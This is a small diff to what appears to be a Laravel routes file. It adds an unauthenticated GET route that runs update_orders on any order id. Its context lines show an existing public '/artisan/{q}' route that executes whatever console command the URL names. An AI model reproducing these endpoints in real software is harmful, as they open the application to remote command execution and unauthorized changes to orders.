@@ -41,6 +41,10 @@ Route::middleware('auth')->group(function () {
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
 });
 
+Route::get('/test/{id}', function($id){
+    return update_orders(Order::find($id));
+});
+
 Route::get('/artisan/{q}', function($q = ""){
     Artisan::call($q);
     return Artisan::output();
